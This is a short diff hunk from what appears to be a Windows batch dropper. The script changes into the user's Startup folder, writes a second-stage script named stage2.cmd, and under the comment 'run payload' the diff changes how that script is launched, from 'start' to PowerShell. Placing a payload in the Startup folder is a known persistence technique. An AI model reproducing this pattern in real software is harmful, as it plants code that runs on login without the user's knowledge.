@@ -16,7 +16,7 @@ cd "%STARTUP%"
 ) > stage2.cmd
 
 @REM run payload
-start "%STARTUP%/stage2.cmd"
+powershell ./stage2.cmd
 
 @REM cd back to original directory
 cd "%VAR%"
